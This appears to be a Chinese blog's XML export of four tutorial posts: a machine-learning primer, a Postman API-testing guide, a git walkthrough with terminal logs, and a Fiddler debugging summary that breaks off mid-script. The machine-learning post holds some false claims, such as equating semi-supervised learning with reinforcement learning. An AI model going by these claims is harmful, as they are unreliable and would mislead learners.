业务系统发展的历史最开始的时候基本上是靠人拍脑袋决定业务的方向，后面引入了数据的因素，也就是让一批懂数据分析的人，按照不同的维度整理报表，同样人的因素在里面依然重要。结论准确不准确，依靠的是这个人的经验如何。 而第三个阶段就是机器学习，可以分为离线以及在线学习。 离线学习：利用空余时间训练模型，然后把模型应用到原来的系统中。 在线学习：来一条数据就可以加入原有的模型中，也就是模型是实时更新的。主要还是电商、搜索等行业需求比较多。 在线学习和离线学习在算法层面其实没有什么差异。 生活中的机器学习关联规则最典型的案例是啤酒和尿布，具体的可见什么是机器学习 这个算法也就有了个新的名称，叫“购物篮算法” 聚类使用聚类可以解决用户细分精准营销的问题。聚类算法可以把一堆消费的数据进行分析，将用户分为若干类。再由业务人员去看哪一类的人员有什么样的消费特征。 朴素贝叶斯和决策树朴素贝叶斯的典型应用是垃圾邮件识别。 贝叶斯就是通过一些公式计算事件A对事件B的发生概率的影响，所以垃圾邮件识别就是通过邮件的一些特征，比如一些关键词、发件人等来判断该邮件是垃圾邮件的概率。 决策树主要用在防信用卡欺诈上，主要是银行用来进行信贷的风险识别，以决定是否放贷给你，它可以识别你是否有能力偿还贷款，另一方面还可以判断你是否是恶意骗贷。 ctr预估和协同过滤ctr预估主要用于搜索引擎的互联网广告，对于每条链接，百度都会对它进行点击率进行评估，然后把预测出来的最可能点击的链接放到第一位。里面使用的算法就叫“线性的逻辑回归”。 协同过滤主要用在推荐系统里面。其实就非常类似于之前讲过的购物车分析，只是可能的算法不一样，但是要解决的问题都一样。 自然语言处理和图像识别自然语言处理又是机器学习的另一个领域了，可以进行 情感分析 实体识别：可以把人名、地名等识别出来 深度学习目前主要用于图像识别，可以对图片进行深度学习 ，识别图片中人物的特征。 数据分析和机器学习的区别本章主要介绍数据分析与机器学习之间的区别在哪里。 首先他们分析的数据不同， 数据分析主要处理的是交易数据，而机器学习主要分析的是行为数据，比如搜索历史、点击历史、评论等。 从这两类数据就衍生出数据量的不同，交易数据明显就是少量的数据，而用户的行为数据就是海量的数据。 对两种数据分析方法也是不一样的 对交易数据一致性要求非常高，而行为数据一致性要求并不高。所以行为数据一般使用NoSQL来处理。NoSQL数据库只能用来处理行为数据，因为它的底层架构就是分布式的，而且强调CAP的概念，也就是在保证数据吞吐量的前提下，会对一致性大大折扣。 所以对于交易数据而言，我们通常可以采用采样分析的方法。对行为数据，我们一般采用全量分析，这也是我们强调Hadoop等海量数据分析平台的原因 他们要回答的问题也是不一样的。 传统的数据分析，其实是想要报告历史上发生了的事情的。比如过年3年内，哪些是我们的优质客户，业绩如何等等。 而机器学习更重要的是预测未来会发生什么事情，这就是二者最本质的区别。 采用的技术手段不同。 数据分析主要是靠人的经验来进行分析建模，利用OLAP联机的分析工具。分析的能力受限于分析师本人。也限制了我们数据处理的维度以及属性。 而机器学习主要靠算法驱动，可以维度可以相当大。 实际上，部分算法已经很成熟了，比如推荐系统算法等。 参与者不同。 数据分析主要靠分析师的能力。 而机器学习靠算法来驱动，主要靠数据质量来决定结果，而算法的区别其实没有那么悬殊。 服务的对象不同。 数据分析主要面向的还是高层，为他们提供决策驾驶舱。机器学习更多的是面向个人。 常用算法分类别机器学习的算法相当之多，我们可以进行简单的分类，而且分类的方法也多种多样， 按学习方法分类别，我们可以把算法分为： 有监督学习： 对分类数据提前打好了标签，然后对一堆数据进行训练。 典型的有监督学习算法是分类算法和回归算法，这两者明确给出了最终的目的是什么。比如分类算法给出了Y，也就是明确了最终可以区分出那些是垃圾，那些是正常邮件。 无监督学习 就是我们最终要分的类别其实我们事先是不知道的。最典型的就是聚类。只能让算法自己的推测出Y是什么。 半监督学习：也叫强化算法。 有目的，但是可能不准确，然后一步一步的修正。 第二种分类的方法是根据我们要解决的问题来进行分类。 分类与回归：根据问题来进行分类。 聚类 标注：给一段文本，对里面的词语打上标签。 第三种分类是生成模型和判别模型，这种分类算法直指算法本质。 生成模型：它不会告诉你属于哪一类，只是告诉你属于哪一类的概率。 判别模型：相当于有个函数，给一个输入，就可以告诉这个数据属于哪个一类别，直指最后的目的。 所以他们回答问题的方式是不一样的。 机器学习常见的算法 机器学习解决问题的流程机器学习要解决的问题相对而言还是比较单纯的，一个是预测的问题，一个是聚类的问题。 而预测问题无非就是要预测所属的分类要么就是预测数值，本质上就是要预测的Y是个连续型的变量还是一个离散型的变量。 所以机器学习要解决的问题是比较单纯的。 为什么会出现了这么多算法呢？他们有没有相似性。 下面我们可以介绍一下机器学习总的框架，介绍一下算法的通用的思想和指导的原则。 下面我们来看机器学习是怎么样解决问题的。 确定目标做机器学习之前我们肯定需要先确认业务目标的，看看业务层面要解决什么问题。然后 分析业务上有什么样的需求 搜集历史数据：数据搜集得越多，则模型构建得更精确。 接着就是做很重要的一步就是数据的预处理，做整合，提取一些特征。 比如说滴滴打车可能与天气有关，所以天气的数据可能就非常重要，我们可以把它们单独提取出来。 从纯算法来提升性能其实很有限，而数据的质量决定了最后的效果，所以数据的特征工程最重要，难点也在如何构建特征工程上。 训练模型定义模型——>定义损失函数——>优化算法 接下来就是构建模型。 首先我们要定义一个模型，其实就一个函数，只是有些参数我们不知道。这个模型是根据我们要解决的问题来定义的。 然后定义损失函数:做机器学习，其实就是要做预测，既然是预测，所以一定是与真实情况有偏差的。损失函数就是定义一个偏差的大小，就是一个标准。评价的标准，相似程度有多大。评估这个模型好不好。 回归问题的损失函数比较容易定义，因为回归就是找一个恰当的模型，我们把真实的情况减去使用这个模型得到的值就可以获得到损失函数 但是分类问题就比较难做了。 优化算法： 让损失函数取最小值的。也就是让函数求最小值。 英文： 中文： 模型评估我们是从历史的数据中得到的模型，需要进行验证， 交叉验证 效果评估 Demo图片按照色彩聚类 待续… 参考文献[1] 什么是机器学习 [2] 初识机器学习-理论篇 [3] 初识机器学习]]></content>
      <categories>
        <category>Machine  Learning</category>
      </categories>
      <tags>
        <tag>ML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Postman使用教程]]></title>
    <url>%2F2019%2F08%2F17%2FPostman%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[PostMan使用教程(一)下载安装1.进入postpostman官网 https://www.getpostman.com/apps ，自行下载安装，我这里下载使用的是Windows版。 2.安装完成后，点击图标启动Postman。 3.根据界面提示注册一个账户，已有账户的的同学请进行登陆操作。不妨采用邮箱注册。 4.登陆成功后，创建测试集合，用来管理测试用例，并输入测试集名称。 5.根据接口测试文档输入Request以下参数信息 认识Postman1.Postman背景介绍 ​ 用户在开发或者调试网络程序或者是网页B/S模式的程序的时候是需要一些方法来跟踪网页请求的，Postman这款网页调试工具不仅可以调试简单的css、html、脚本等简单的网页基本信息，它还可以发送几乎所有类型的HTTP请求！Postman在发送网络HTTP请求方面可以说是Chrome插件类产品中的代表产品之一。 2.Postman基础功能 3.接口请求流程 12341.GET请求(1)GET请求：点击Params，输入参数及value，可输入多个，即时显示在URL链接上。所以，GET请求的请求头与请求参数如在接口文档中无特别声明时，可以不填。(2)响应示例：有请求的响应状态码，响应时间，以及响应大小(3)响应体示例：响应的格式可以有多种，一般情况下，我们自定义接口的话是json格式的响应体。 122. POST请求POST请求一：表单提交 ​ 在下图示例中设置了请求方法，请求URL，请求参数，但是没有设置请求头。在我的使用过程中，请求头是根据请求参数的形式自动生成的请求头中的Content-Type与请求参数的格式之间是有关联关系，比如： 122. POST请求POST请求二：json提交 ​ 当我们选择JSON(application/json) 是会自动帮我们设置 headers 为 application/json。 12342. POST请求POST请求三：xml提交POST请求四：二进制文件提交其它请求方式如PUT,DELETE 大致流程和GET,POST 差不多，这里就不一一举例说明了. 4.身份验证Authentication 1234567891、Basic Auth 基础的验证，所以会比较简单，会直接把用户名、密码的信息放在请求的Header中。2、Digest Auth 要比Basic Auth复杂的多。使用当前填写的值生成，authorization header。所以在生成header之前要确保设置的正确性。如果当前的header已经存在，postman会移除之前的header。3、OAuth 1.0 postman的OAuth helper让你签署支持OAuth1.0基于身份验证的请求。OAuth不用获取access token,你需要去API提供者获取的。OAuth 1.0可以在header或者查询参数中设置value。4、OAuth 2.0 postman支持获得OAuth 2.0 token并添加到requests中。 实测一个查询手机号码归属地接口1.接口测试 ==文档部分信息== 键 值 接口地址： http://apis.juhe.cn/mobile/get 返回格式： json/xml 请求方式: get ==请求参数说明== 名称 必填 类型 说明 phone 是 int 需要查询的手机号码或手机号前7位 key 是 string 应用APPKEY(应用详细页查询) dtype 否 string 返回数据的格式xml或json，默认json ==根据上图接口文档相关信息填写request请求并获取响应== 2.接口断言 ==填写完以上请求参数后，尝试编写断言进行实际结果与预测结果进行对比== ==返回参数说明== 名称 类型 说明 error_code int 返回码 reason string 返回说明 result string 返回结果集 province string 省份 city string 城市，（北京，上海，重庆，天津等直辖市可能为空） areacode string 区号，（部分记录为空） zip string 邮编，（部分记录可能为空） company string 运营商 ==JSON返回示例== 12345678910111213{ "resultcode": "200", "reason": "Return Successd!", "result": { "province": "湖北", "city": "武汉", "areacode": "027", "zip": "430000", "company": "电信", "card": "" }, "error_code": 0} ==服务级错误码参照(error_code)== 错误码 说明 201101 手机号码不能为空 201102 错误的手机号码 201103 查询无结果 ==系统级错误码参照== 错误码 说明 10001 错误的请求KEY 10002 该KEY无请求权限 10003 KEY过期 ==断言服务器返回http协议状态码为200== ==验证服务器返回error_code字段值为0== ==验证服务器返回reason字段值为Return Successd!== ==验证服务器返回province字段值为北京== ==相同的验证方法，把后面的字段值验证完，并save保存至测试集中== ==保存完成后，在左侧测试集中出现脚本名称，点击 + 继续开发新的脚本== ==在所有接口请求开发完成后，可以点击send发送请求，进行调试操作== ==将Postman开发好的脚本导出，生成 *.json格式的文件== 参考文献 Postman使用教程详解 Postman使用方法详解]]></content>
      <categories>
        <category>debug工具</category>
      </categories>
      <tags>
        <tag>Postman</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git入门]]></title>
    <url>%2F2019%2F08%2F17%2Fgit%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Git入门Git介绍​ 版本控制。 牛X的互联网，牛X的大神们都在用 完整的版本控制功能，解决多人协作的问题 提高开发效率 程序员的必备技能，务必学习git,并习惯把自己的代码同步到github上 Git不同于github，理清两者之间的联系和差异 Git安装官网下载，傻瓜式安装即可。 Git仓库信息配置- git configgit config --global user.name "Bicomir" - git config --global user.email "18120570301@163.com" - git config --list 初始化版本库- git init 添加文件到版本库- git add - git commit 查看仓库状态- git status Git工作流​ 工作区–>暂存区–>版本库 ​ 假设有这么个故事是这样展开的，有个程序员刚去上班，每天产品经理会给他布置任务，任务以bash demo命名。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174# 1.第一天产品经理bash demo任务完成wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git statusOn branch masterUntracked files: (use "git add ..." to include in what will be committed) bash_demo.txtnothing added to commit but untracked files present (use "git add" to track)wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git add bash_demo.txtwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git statusOn branch masterChanges to be committed: (use "git reset HEAD ..." to unstage) new file: bash_demo.txtwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git commit -m "bash 1st commit"[master 9adb6ec] bash 1st commit 1 file changed, 1 insertion(+) create mode 100644 bash_demo.txtwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git statusOn branch masternothing to commit, working tree clean# 2.事情不是那么简单，下午增加了临时任务，并要求下班前完成,下班前把东西放到了暂存区。wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git statusOn branch masterChanges not staged for commit: (use "git add ..." to update what will be committed) (use "git checkout -- ..." to discard changes in working directory) modified: bash_demo.txtno changes added to commit (use "git add" and/or "git commit -a")wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git add bash_demo.txt# 3.第二天上班，被产品经理告知昨天附加需求多余，要求改回。wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git statusOn branch masterChanges to be committed: (use "git reset HEAD ..." to unstage) modified: bash_demo.txtwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git reset HEAD bash_demo.txtUnstaged changes after reset:M bash_demo.txtwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git statusOn branch masterChanges not staged for commit: (use "git add ..." to update what will be committed) (use "git checkout -- ..." to discard changes in working directory) modified: bash_demo.txtno changes added to commit (use "git add" and/or "git commit -a")wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git checkout -- bash_demo.txtwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git statusOn branch masternothing to commit, working tree clean# 4.将附加任务改回后，并开始第二天的任务。wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git statusOn branch masterChanges not staged for commit: (use "git add ..." to update what will be committed) (use "git checkout -- ..." to discard changes in working directory) modified: bash_demo.txtno changes added to commit (use "git add" and/or "git commit -a")wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git add bash_demo.txtwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git statusOn branch masterChanges to be committed: (use "git reset HEAD ..." to unstage) modified: bash_demo.txtwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git commit -m "2nd commit"[master 1111222] 2nd commit 1 file changed, 2 insertions(+), 1 deletion(-)wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git statusOn branch masternothing to commit, working tree clean# 5.被产品经理告知第二天的需求其实不需要，需要第一个版本。wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git logcommit 111122203a20e045217ff59323edcfeb8f12cc92 (HEAD -> master)Author: Bicomir Date: Mon Jul 8 20:09:53 2019 +0800 2nd commitcommit 9adb6ec069364e8e09e726aed9109b70e8ab86beAuthor: Bicomir Date: Mon Jul 8 19:58:42 2019 +0800 bash 1st commitcommit e8fe36664ee4f613126382440f58f5b30799c30bAuthor: Bicomir Date: Mon Jul 8 19:43:06 2019 +0800 repo2 1st commitwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git rests --hardgit: 'rests' is not a git command. See 'git --help'.The most similar command is resetwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git reset --hard 9adb6ec069364e8e09e726aed9109b70e8ab86beHEAD is now at 9adb6ec bash 1st commitwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git statusOn branch masternothing to commit, working tree clean# 第三天，被产品经理告知，bash demo这个需求不需要，要求删除。wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git rm bash_demo.txtrm 'bash_demo.txt'wjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ ls -a./ ../ .git/ test.txtwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git statusOn branch masterChanges to be committed: (use "git reset HEAD ..." to unstage) deleted: bash_demo.txtwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git commit -m "delete bash_demo"[master 311da2e] delete bash_demo 1 file changed, 1 deletion(-) delete mode 100644 bash_demo.txtwjq@LAPTOP-H1TBSSQ3 MINGW64 /d/git_Demo (master)$ git statusOn branch masternothing to commit, working tree clean 本地与远程仓库远程仓库​ 我所熟知的远程仓库国外有GitHub、Bitbucket、GitLab,Azure Devops,国内有Coding，实际开发中国内或国外看场景都有可能用的到，不管仓库是什么，大体上差不多，在这里以熟知的GitHub为例。 ​ git remote add -> git pull -> git push -> git clone 创建SSH Keyssh-keygen -t rsa -C "youremail@example.com" 测试是否连通 ssh -T git@github.com 添加远程仓库git remote add origin git@github.com:tylerdemo/demo4.git git pull origin master --allow-unrelated-histories git push -u origin master 克隆仓库​ 方便团队协作开发，就是把远端的代码复制一份到本地。 git clone git@github.com:tylerdemo/demo4.git 标签管理1234567891011121314# 查看所有标签git tag# 创建标签git tag name# 指定提交信息git tag -a name -m "comment"# 删除标签git tag -d name# 标签发布git push origin name ​ git tag -> git push,以向远端仓库推送一个标签V1.0.1为例，命令如下: ​ git tag ​ git tag v1.0.1 ​ git tag ​ git push origin v1.0.1 ​ git tag -d v1.0.1 分支管理创建自己的分支，既安全又不影响工作。 git branch -> git cheakout -> git merge 123456789101112131415161718192021# 第一次任务git initgit statusecho "first branch demo" >> branch.txtgit statusgit add branch.txtgit commit -m "first branch commit"git status# 需要创建分支git branch feature_x # 创建分支git branch # 查看当前分支git cheakout feature_x # 切换分支echo "new feature add" >> branch.txtgit add branch,txtgit commit -m "new feature add"git status# 新代码合并到master分支上git cheakout mastergit merge feature_xcat branch.txtgit branch -d feature_x # 删除分支 ​ 建议平时为提高开发效率使用source tree,高级的一些用法用命令行。 ​ 在这里，只是记录了常见的git命令，实际上高级玩家的玩法会复杂的多，后期再逐步积累吧，]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fiddler抓包工具总结]]></title>
    <url>%2F2019%2F08%2F17%2FFiddler%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Fiddler介绍Fiddler（中文名称：小提琴）是一个HTTP的调试代理，以代理服务器的方式，监听系统的Http网络数据流动，Fiddler可以也可以让你检查所有的HTTP通讯，设置断点，以及Fiddle所有的“进出”的数据（我一般用来抓包）,Fiddler还包含一个简单却功能强大的基于JScript .NET事件脚本子系统，它可以支持众多的HTTP调试任务。 Fiddler官方网站提供了大量的帮助文档和视频教程,这是学习Fiddler的最好资料。 Fiddler_官方网站 Fiddler_官方文档 Fiddler_官方视频 Fiddler_官方插件 工作原理 其工作原理是，Fiddler是以代理WEB服务器的形式工作的,浏览器与服务器之间通过建立TCP连接以HTTP协议进行通信，浏览器默认通过自己发送HTTP请求到服务器，它使用代理地址:127.0.0.1, 端口:8888. 当Fiddler开启会自动设置代理， 退出的时候它会自动注销代理，这样就不会影响别的程序。不过如果Fiddler非正常退出，这时候因为Fiddler没有自动注销，会造成网页无法访问。解决的办法是重新启动下Fiddler。 HTTP协议简介​ 什么是HTTP协议 ​ 一般协议是指计算机通信网络中两台计算机之间进行通信所必须共同遵守的规定或规则，超文本传输协议(HTTP)是一种通信协议，它允许将超文本标记语言(HTML)文档从Web服务器传送到客户端的浏览器，目前我们使用的是HTTP/1.1 版本。 ​ URL详解 ​ URL(Uniform Resource Locator)地址用于描述一个网络上的资源, 基本格式如下： ​ schema://host[:port#]/path/.../[?query-string][#anchor] 名称 解释 scheme 指定低层使用的协议(例如：http, https, ftp) host HTTP服务器的IP地址或者域名 port# HTTP服务器的默认端口是80，这种情况下端口号可以省略。如果使用了别的端口，必须指明，例如 http://www.test.com:8080/ path 访问资源的路径 query-string 发送给http服务器的数据 anchor 锚 HTTP消息的结构 Request 先看Request 消息的结构, Request 消息分为3部分，第一部分叫Request line, 第二部分叫Request header, 第三部分是body. header和body之间有个空行. 第一行中的Method表示请求方法,比如”POST”,”GET”, Path-to-resoure表示请求的资源， Http/version-number 表示HTTP协议的版本号,当使用的是”GET” 方法的时候， body是为空的. Response 再看Response消息的结构, 和Request消息的结构基本一样。 同样也分为三部分,第一部分叫Response line, 第二部分叫Response header，第三部分是body. header和body之间也有个空行. 常见状态码Response 消息中的第一行叫做状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。状态码用来告诉HTTP客户端,HTTP服务器是否产生了预期的Response.HTTP/1.1中定义了5类状态码， 状态码由三位数字组成，第一个数字定义了响应的类别。 状态码 解释 1XX 提示信息，表示请求已被成功接收，继续处理 2XX 成功，表示请求已被成功接收，理解，接受 3XX 重定向，要完成请求必须进行更进一步的处理 4XX 客户端错误，请求有语法错误或请求无法实现 5XX 服务器端错误，服务器未能实现合法的请求 200 OK 最常见的就是成功响应状态码200了， 这表明该请求被成功地完成，所请求的资源发送回客户端 302 Found 重定向，新的URL会在response 中的Location中返回，浏览器将会自动使用新的URL发出新的Request.例如在IE中输入， http://www.google.com. HTTP服务器会返回302， IE取到Response中Location header的新URL, 又重新发送了一个Request. 304 Not Modified 代表上次的文档已经被缓存了， 还可以继续使用，例如打开博客园首页, 发现很多Response 的status code 都是304[提示： 如果你不想使用本地缓存可以用Ctrl+F5 强制刷新页面] 400 Bad Request 客户端请求与语法错误，不能被服务器所理解 403 Forbidden 服务器收到请求，但是拒绝提供服务 404 Not Found 500 Internal Server Error 服务器发生了不可预期的错误 503 Server Unavailable 服务器当前不能处理客户端的请求，一段时间后可能恢复正常 主界面Fiddler的主界面分为 工具面板、会话面板、监控面板、状态面板，下面进行逐一进行介绍。 工具面板 说明 注释、重新请求、删除会话、继续执行、流模式/缓冲模式、解码、保留会话、监控指定进程、寻找、保存会话、切图、计时、打开浏览器、清除IE缓存、编码/解码工具、弹出控制监控面板、MSDN、帮助 两种模式 分为缓冲模式和流模式这两种。 缓冲模式(Buffering Mode) Fiddler直到HTTP响应完成时才将数据返回给应用程序。可以控制响应，修改响应数据。但是时序图有时候会出现异常. 流模式(Streaming Mode) Fiddler会即时将HTTP响应的数据返回给应用程序。更接近真实浏览器的性能。时序图更准确。但是不能控制响应. 会话面板 下面是会话面板横栏的含义： 名称 含义 # 抓取HTTP Request的顺序，从1开始，以此递增 Result HTTP状态码 Protocol 请求使用的协议，如HTTP/HTTPS/FTP等 Host 请求地址的主机名 URL 请求资源的位置 Body 该请求的大小 Caching 请求的缓存过期时间或者缓存控制值 Content-Type 请求响应的类型 Process 发送此请求的进程：进程ID Comments 允许用户为此回话添加备注 Custom 允许用户设置自定义值 会话面板左侧栏的图标含义： 图标 含义 请求已经发往服务器 已从服务器下载响应结果 请求从断点处暂停 响应从断点处暂停 请求使用 HTTP 的 HEAD 方法，即响应没有内容（Body） 请求使用 HTTP 的 POST 方法 请求使用 HTTP 的 CONNECT 方法，使用 HTTPS 协议建立连接隧道 响应是 HTML 格式 响应是一张图片 响应是脚本格式 响应是 CSS 格式 响应是 XML 格式 响应是 JSON 格式 响应是一个音频文件 响应是一个视频文件 响应是一个 SilverLight 响应是一个 FLASH 响应是一个字体 普通响应成功 响应是 HTTP/300、301、302、303 或 307 重定向 响应是 HTTP/304（无变更）：使用缓存文件 响应需要客户端证书验证 服务端错误 会话被客户端、Fiddler 或者服务端终止 监控面板 统计报表 请求总数、请求包大小、响应包大小； 请求起始时间、响应结束时间、握手时间、等待时间、路由时间、TCP/IP传输时间； HTTP状态码统计； 返回的各种类型数据的大小统计以及饼图展现。 时间轴 每个网络请求都会经历域名解析、建立连接、发送请求、接受数据等阶段。把多个请求以时间作为 X 轴，用图表的形式展现出来，就形成了瀑布图。在Fiddler 中，只要在左侧选中一些请求，右侧选择Timeline标签，就可以看到这些请求的瀑布图。 初看上图，心中不免有几个问题？ 图标的 Y 轴上显示的是简化后的 URL。为什么有些是绿色的，有些是黑色的？ 为什么第一个请求用阴影线来表示，其它请求却都是实心的？ 请求条的不同颜色分别代表什么？ 每个请求中的黑色竖线表示什么？ 请求后面的图标（如闪电和软盘）代表了什么？ 每个请求前面两个小圆圈是什么，为什么有的是红色，有的是绿色？ 答案是： 绿色的请求表示这是一个“有条件的请求”。HTTP 协议定义了 5 个条件请求头部，最常见的两个是“If-Modified-Since”和“If-None-Match”。服务器根据这两个头部来验证本地缓存是否过期，如果过期则正常返回资源的最新版本；否则仅返回 304 Not Modified，浏览器继续使用本地缓存。包含条件请求头部的请求用绿色显示，否则用黑色。 有阴影线的请求是缓冲模式下的请求，实心的是流模式下的请求。Fiddler 提供了缓冲（Buffering）和流（Streaming）两种抓包模式：缓冲模式下，Fiddler 会在响应完成时才将数据返回给应用程序（通常是浏览器），这种模式下可以控制响应，方便地修改响应内容；流模式下，Fiddler 会实时返回响应数据给浏览器，但没办法控制响应。一般使用流模式，瀑布图会更真实一些。这两种模式可以通过 Fiddler 的工具栏选择。特别的，通过 Fiddler 的“AutoResponder”功能返回的响应，只能是缓冲模式。 请求条的不同颜色对应着不同类型的响应，根据响应头的 MIME Type 来归类。如浅绿色表示图片类型的响应；深绿色是 JavaScript；紫色是 CSS；其它都是蓝色。 请求中的黑色竖线，表示的是浏览器收到服务端响应的第一个字节这一时刻。这个时间受 DNS 解析、建立连接、发送请求、等待服务端响应等步骤的影响。 请求条后面的图标表示响应的某些特征。如软盘图标表示这个响应正文从本地获得，也就是说服务端返回了 304；闪电表示这是 Fiddler 的“AutoResponder”的响应；向下的箭头表示响应是 302，需要重定向；红色感叹号说明这个请求有错误发生（状态码是 4XX 或 5XX）。特别的，如果请求条后面有一个红色的X，说明服务端响应完这个请求之后，断开了连接。出现这种情况一般有两种可能：HTTP/1.0 的响应中没有 Connection: Keep-Alive；或者是 HTTP/1.1 的响应中包含了 Connection: close。使用持久连接可以省去建立连接的开销，也可以减小 TCP 慢启动和其它拥塞控制机制带来的影响，总之是好处多多。 请求前面的红色圆圈表示这个连接是新建的，绿色表示是复用的。上面的圆圈表示的是浏览器到 Fiddler 的连接，下面的圆圈是 Fiddler 到服务端的连接。 状态面板 控制台 Fiddler的左下角有一个命令行工具叫做QuickExec,允许你直接输入命令。 常见的命令有： 命令 解释 help 打开官方的使用页面介绍，所有的命令都会列出来 cls 清屏 (Ctrl+x 也可以清屏) select 选择会话的命令 ?.png 用来选择png后缀的图片 bpu 截获request bpafter 截获response Request消息的结构 Response消息的结构 常用功能监听httpsFiddler不仅能监听HTTP请求而且默认情况下也能捕获到HTTPS请求，Tool -> Fiddler Option -> HTTPS下面进行设置，勾选上“Decrypt HTTPS traffic”，如果不必监听服务器端得证书错误可以勾上“Ignore server certification errors”，也可以跳过几个指定的HOST来缩小或者扩大监听范围。 Host切换Tools->Hosts, 模拟各类场景 通过GZIP压缩，测试性能 模拟Agent测试，查看服务端是否对不同客户端定制响应 模拟慢速网络，测试页面的容错性 禁用缓存，方便调试一些静态文件或测试服务端响应情况 根据一些场景自定义规则 低网速模拟 有时出于兼容性考虑或者对某处进行性能优化，在低网速下往往能较快发现问题所在也容易发现性能瓶颈，可惜其他调试工具没能提供低网速环境，而强大的Fiddler考虑到了这一点，能够进行低网速模拟设置Rules > Performance > Stimulate Modem Speeds。 Compare(对比文本)有时候两个请求比较相似，想找出区别，可以下载插件winziff，下载地址是 http://www.grigsoft.com/download-windiff.htm，下载以后，放到tools- fiddler option tool文件夹下， 设置好路径就可以使用了。 Composer(构造器)​ 请求构造顾名思义就是我们可以模拟请求，也就是说我们可以借助Fiddler的Composer 在不改动开发环境实际代码的情况下修改请求中的参数值并且方便的重新调用一次该请求，然后相比较2次请求响应有何具体不同。任何一个请求参数只要是合法的取值再次调用后都会有相应的响应，那么你想要的任意一个合法请求组合自然也能够按照你的意愿构造出来，然后再次调用以及查看返回数据，十分方便！ ​ Composer允许自定义请求发送到服务器，可以手动创建一个新的请求，也可以在会话表中，拖拽一个现有的请求，Parsed模式下你只需要提供简单的URLS地址即可（也可以在RequestBody定制一些属性，如模拟浏览器User-Agent）。 Filters(过滤监控)​ 对一个重新载入的页面进行抓包，如果包的条目过多而你需要关注的就那么几项的话，可以使用Fiddler的过滤器Filters进行抓包，那么抓包时只会抓取你希望抓到的那些包。切换到Filters标签勾选Use filter，以便激活过滤器，这样下面的各种过滤方式就可以进行选择了。 选项1 解释 No zone filter 不设置hosts过滤 Show Only Intranet Hosts 只显示内网HOST Show Only Internet Hosts 只显示外网HOST 选项2 解释 No Host Filter 不设置hosts过滤 Hide The Following Hosts 隐藏过滤到的域名 Show Only The Following Hosts 只显示过滤到的域名 Flag The Following Hosts 标记过滤到的域名 AutoResponder(请求重定向)所谓请求无非就是需要调用到的一些资源(包括JS、CSS和图片等)，所谓重定向就是将页面原本需要调用的资源指向其他资源(你能够控制的资源或者可以引用到的资源)。 (1)你可以将前台服务器的诸多或者某个资源在本地做个副本，如果正常网络访问环境下该资源出现了BUG而导致开发环境崩溃时，可以先将这个资源的请求重定向到本地副本，这样就可以继续进行开发调试你的页面，从而大量节省资源维护的等待时间。 (2)你也可以将多人同时维护的某个JS文件复制一份出来在本地，当你的开发调试收到他人调试代码干扰时，可以将这个JS的调用重定向到本地无干扰的JS文件，进行无干扰开发，功能开发完成并调试OK之后再将你的代码小心合入到开发环境中，这样就可以避免受到他人干扰专心搞你的模块开发，也就是说能够将JS文件脱离开发环境却不影响线上调试。 (3)你还可以将样式文件或者图片指向本地如果需要的话。开发过程中的很多页面其实都是惨不忍睹的，究其原因很大程度上是因为缺少对应的样式文件或者没有图片资源，所以样式文件和图片的重定向会对美感稍有要求的开发人员带来福音。 插件介绍Format Script Fiddler Script 是用JScript.NET语言写的，JScript.NET.aspx) 在这个方法中修改Request的内容， 我们用得最多, 1static function OnBeforeRequest(oSession: Session) 在这个方法中修改修改Response的内容 1static function OnBeforeResponse(oSession: Session) 在IP Main方法中添加 1FiddlerObject.UI.lvSessions.AddBoundColumn("HostIP", 50, "x-hostIP"); 请求，响应延迟 在OnBeforeRequest 添加 12oSession["request-trickle-delay"] = "3000"; oSession["response-trickle-delay"] = "3000"; 我们可以控制Session在Fiddler中显示的样式，把这段脚本放在OnBeforeRequest(oSession: Session) 方法下，并且点击”Save script”, 这样所有的cnblogs的会话都会显示红色. 123if (oSession.HostnameIs("www.cnblogs.com")) { 